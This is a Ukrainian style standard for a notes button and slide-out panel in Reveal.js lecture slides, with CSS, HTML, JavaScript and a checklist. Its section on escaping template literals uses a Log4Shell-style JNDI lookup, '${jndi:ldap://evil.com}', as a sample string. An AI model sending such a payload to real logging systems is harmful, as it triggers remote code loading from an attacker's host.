# Стандарт кнопки «Конспект» (Notes Button) для лекцій

> Цей документ описує обов'язкові вимоги до реалізації кнопки конспекту в кожній
> лекційній презентації (`presentation.html`). Дотримуйтесь їх без відхилень, щоб
> всі лекції виглядали і працювали однаково.

---

## 1. Загальна концепція

Кожна лекція є автономним Reveal.js HTML-файлом. До нього додається:
- **Фіксована кнопка** `📄` у правому нижньому куті (не перекриває стрілки навігації Reveal.js).
- **Бокова панель** (drawer), що виїжджає справа при натисканні кнопки і показує конспект для поточного слайду.

Дані конспекту зберігаються прямо у `presentation.html` у масиві `SLIDE_NOTES` як HTML-рядки (one entry per slide).

---

## 2. CSS — вставити у `<style>` всередині `<head>`

```css
/* ===== Notes Panel ===== */
#notes-btn {
    position: fixed; bottom: 18px; right: 90px; z-index: 10000;
    background: #1f6feb; color: #fff; border: none; border-radius: 50%;
    width: 46px; height: 46px; font-size: 1.25em; cursor: pointer;
    box-shadow: 0 2px 10px rgba(0,0,0,0.55); transition: background 0.2s;
    display: flex; align-items: center; justify-content: center;
}
#notes-btn:hover { background: #388bfd; }
#notes-panel {
    position: fixed; top: 0; right: -420px; width: 410px; height: 100%;
    background: #0d1117; border-left: 1px solid #30363d;
    z-index: 9999; display: flex; flex-direction: column;
    transition: right 0.28s cubic-bezier(.4,0,.2,1);
    box-shadow: -4px 0 20px rgba(0,0,0,0.5);
}
#notes-panel.open { right: 0; }
#notes-panel-header {
    display: flex; justify-content: space-between; align-items: center;
    padding: 14px 16px; border-bottom: 1px solid #30363d;
    background: #161b22; flex-shrink: 0;
}
#notes-panel-title { font-size: 0.9em; font-weight: bold; color: #58a6ff; }
#notes-panel-close {
    background: none; border: none; color: #8b949e; cursor: pointer;
    font-size: 1.2em; padding: 2px 6px; border-radius: 4px;
}
#notes-panel-close:hover { background: #21262d; color: #c9d1d9; }
#notes-panel-body {
    flex: 1; overflow-y: auto; padding: 16px 18px;
    font-size: 0.82em; line-height: 1.65; color: #c9d1d9;
}
#notes-panel-body h4 { color: #e8b04b; margin: 0.6em 0 0.3em; font-size: 1em; }
#notes-panel-body p { margin: 0.4em 0; }
#notes-panel-body code { background: #161b22; padding: 1px 4px; border-radius: 3px; font-size: 0.9em; color: #79c0ff; }
#notes-panel-body ul { padding-left: 1.2em; margin: 0.3em 0; }
#notes-panel-body li { margin: 0.2em 0; }
```

> **Чому `right: 90px` для кнопки?** Reveal.js розміщує стрілки навігації у правому
> нижньому куті. Зміщення на 90 px вліво запобігає перекриттю.

---

## 3. HTML-розмітка — вставити одразу перед `<script>`, після `</div></div>`

```html
<!-- ===== Notes Button & Panel ===== -->
<button id="notes-btn" type="button" onclick="toggleNotesPanel()" title="Конспект до слайду" aria-label="Відкрити конспект до слайду">📄</button>
<div id="notes-panel">
    <div id="notes-panel-header">
        <span id="notes-panel-title">📄 Конспект лекції</span>
        <button id="notes-panel-close" type="button" onclick="toggleNotesPanel()" title="Закрити" aria-label="Закрити конспект">✕</button>
    </div>
    <div id="notes-panel-body">Оберіть слайд для перегляду конспекту.</div>
</div>
```

---

## 4. JavaScript — вставити у `<script>` після `Reveal.initialize({...})`

### 4.1 Масив SLIDE_NOTES

```js
// ===== Slide Notes Data (indexed 0..N-1) =====
// One entry per horizontal slide, in order.
// null  → no notes for this slide (shows fallback message)
// `...` → HTML string displayed in the panel
const SLIDE_NOTES = [
    // 0 — Титульний (конспект не потрібен)
    null,

    // 1 — План лекції (конспект не потрібен)
    null,

    // 2 — Перший змістовний слайд
    `<h4>Заголовок розділу конспекту</h4>
<p>Текст конспекту. Можна використовувати <strong>жирний</strong>, <code>код</code>,
<em>курсив</em> та невпорядковані списки.</p>
<ul>
  <li>Пункт 1</li>
  <li>Пункт 2</li>
</ul>`,

    // ... і так для кожного слайду
];
```

**Правила нумерації**: індекс 0 = перший слайд (титульний), 1 = другий слайд (план), 2 = перший слайд з контентом, і т.д. Кількість елементів у масиві має точно збігатися з кількістю слайдів (`<section>` у `.slides`).

### 4.2 Логіка панелі

```js
let notesPanelOpen = false;

function toggleNotesPanel() {
    const panel = document.getElementById('notes-panel');
    notesPanelOpen = !notesPanelOpen;
    panel.classList.toggle('open', notesPanelOpen);
    if (notesPanelOpen) updateNotesContent();
}

function updateNotesContent() {
    const idx = Reveal.getIndices().h;
    const body = document.getElementById('notes-panel-body');
    const title = document.getElementById('notes-panel-title');
    const content = SLIDE_NOTES[idx];
    title.textContent = `📄 Слайд ${idx + 1} / ${SLIDE_NOTES.length}`;
    body.innerHTML = content || '<p style="color:#8b949e; font-style:italic;">Конспект для цього слайду відсутній.</p>';
}

Reveal.on('slidechanged', () => {
    if (notesPanelOpen) updateNotesContent();
});
```

---

## 5. Порядок блоків у `<script>`

```
Reveal.initialize({ ... });        ← 1. ініціалізація Reveal.js
mermaid.initialize({ ... });       ← 2. ініціалізація Mermaid (якщо є)

const SLIDE_NOTES = [ ... ];       ← 3. масив конспекту

let notesPanelOpen = false;        ← 4. стан панелі
function toggleNotesPanel() { }    ← 5. функції
function updateNotesContent() { }
Reveal.on('slidechanged', ...);    ← 6. обробник подій
```

---

## 6. ⚠️ Критичне правило: екранування `${...}` у template literals

Масив `SLIDE_NOTES` використовує JavaScript **template literals** (backtick-рядки).
Будь-який `${...}` всередині цих рядків інтерпретується як JS-вираз, а не текст.

**Якщо у тексті конспекту є `${...}` (наприклад, приклад команди або YAML):**

| ❌ Неправильно | ✅ Правильно |
|---|---|
| `` `<code>${jndi:ldap://evil.com}</code>` `` | `` `<code>\${jndi:ldap://evil.com}</code>` `` |
| `` `image-ref: 'app:${github.sha}'` `` | `` `image-ref: 'app:\${github.sha}'` `` |

Пояснення: `\${...}` у template literal продукує літеральний рядок `${...}` (без зворотного слеша у виводі). Без екранування JS намагається обчислити вираз; якщо змінна не визначена — `ReferenceError` — і **вся сторінка показує білий екран**.

Альтернатива: використати HTML-entity `&#36;` замість `$`:
```js
`<code>&#36;{jndi:ldap://evil.com}</code>`   // рендериться як ${jndi:...}
```

---

## 7. Допустимий HTML у SLIDE_NOTES

У кожному записі масиву дозволені такі HTML-теги (вони стилізовані CSS із секції 2):

| Тег | Використання |
|-----|-------------|
| `<h4>` | Заголовок підрозділу (жовтий акцент) |
| `<p>` | Абзац тексту |
| `<strong>` | Жирний текст |
| `<em>` | Курсив |
| `<code>` | Inline-код (синій на темному фоні) |
| `<ul>` / `<li>` | Невпорядкований список |
| `<ol>` / `<li>` | Впорядкований список |
| `<br>` | Перенос рядка |

Не використовуйте `<script>`, `<style>`, `<iframe>` або атрибути `onclick` у вмісті конспекту.

---

## 8. Слайди без конспекту

Для слайдів, де конспект відсутній (титульний, план, тощо), запис у масиві має бути `null` (не порожній рядок `""`):

```js
const SLIDE_NOTES = [
    null,   // 0 — титульний
    null,   // 1 — план
    `...`,  // 2 — перший змістовний
    ...
];
```

Панель відобразить: *«Конспект для цього слайду відсутній.»*

---

## 9. Приклад повного файлу (мінімальний)

```html
<!doctype html>
<html lang="uk">
<head>
    <meta charset="utf-8">
    <title>Лекція X</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/black.css">
    <script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
    <style>
        /* ... решта стилів ... */

        /* ===== Notes Panel ===== */
        #notes-btn { position: fixed; bottom: 18px; right: 90px; z-index: 10000;
            background: #1f6feb; color: #fff; border: none; border-radius: 50%;
            width: 46px; height: 46px; font-size: 1.25em; cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.55);
            display: flex; align-items: center; justify-content: center; }
        #notes-btn:hover { background: #388bfd; }
        #notes-panel { position: fixed; top: 0; right: -420px; width: 410px; height: 100%;
            background: #0d1117; border-left: 1px solid #30363d; z-index: 9999;
            display: flex; flex-direction: column;
            transition: right 0.28s cubic-bezier(.4,0,.2,1); }
        #notes-panel.open { right: 0; }
        #notes-panel-header { display: flex; justify-content: space-between;
            padding: 14px 16px; background: #161b22; }
        #notes-panel-title { color: #58a6ff; font-weight: bold; }
        #notes-panel-close { background: none; border: none; color: #8b949e; cursor: pointer; }
        #notes-panel-body { flex: 1; overflow-y: auto; padding: 16px 18px;
            font-size: 0.82em; color: #c9d1d9; line-height: 1.65; }
        #notes-panel-body h4 { color: #e8b04b; }
        #notes-panel-body code { background: #161b22; color: #79c0ff; }
    </style>
</head>
<body>
    <div class="reveal">
        <div class="slides">
            <section><!-- слайд 0 --></section>
            <section><!-- слайд 1 --></section>
            <section><!-- слайд 2 --></section>
        </div>
    </div>

    <!-- ===== Notes Button & Panel ===== -->
    <button id="notes-btn" onclick="toggleNotesPanel()" title="Конспект до слайду">📄</button>
    <div id="notes-panel">
        <div id="notes-panel-header">
            <span id="notes-panel-title">📄 Конспект лекції</span>
            <button id="notes-panel-close" onclick="toggleNotesPanel()" title="Закрити">✕</button>
        </div>
        <div id="notes-panel-body">Оберіть слайд для перегляду конспекту.</div>
    </div>
    <script>
        Reveal.initialize({ hash: true, transition: 'slide', slideNumber: 'c/t',
            center: false, width: 1650, height: 900, margin: 0.04,
            minScale: 0.2, maxScale: 1.0, scrollActivationWidth: 700 });

        const SLIDE_NOTES = [
            null,   // 0 — титульний
            null,   // 1 — план
            `<h4>Заголовок</h4><p>Текст конспекту для слайду 2.</p>`,
        ];

        let notesPanelOpen = false;
        function toggleNotesPanel() {
            const panel = document.getElementById('notes-panel');
            notesPanelOpen = !notesPanelOpen;
            panel.classList.toggle('open', notesPanelOpen);
            if (notesPanelOpen) updateNotesContent();
        }
        function updateNotesContent() {
            const idx = Reveal.getIndices().h;
            const body = document.getElementById('notes-panel-body');
            const title = document.getElementById('notes-panel-title');
            const content = SLIDE_NOTES[idx];
            title.textContent = `📄 Слайд ${idx + 1} / ${SLIDE_NOTES.length}`;
            body.innerHTML = content ||
                '<p style="color:#8b949e;font-style:italic;">Конспект для цього слайду відсутній.</p>';
        }
        Reveal.on('slidechanged', () => { if (notesPanelOpen) updateNotesContent(); });
    </script>
</body>
</html>
```

---

## 10. Контрольний список перед фіналізацією

- [ ] CSS кнопки присутній у `<style>` (`#notes-btn`, `#notes-panel`, ...)
- [ ] HTML-розмітка `#notes-btn` і `#notes-panel` є між `</div></div>` і `<script>`
- [ ] `SLIDE_NOTES.length` === кількість `<section>` у `.slides`
- [ ] Перші два слайди (або всі невпорядковані) = `null`
- [ ] Усі `${...}` у контенті конспекту екрановані як `\${...}` або замінені на `&#36;{...}`
- [ ] Функції `toggleNotesPanel` і `updateNotesContent` визначені ПІСЛЯ `SLIDE_NOTES`
- [ ] `Reveal.on('slidechanged', ...)` зареєстровано в кінці `<script>`
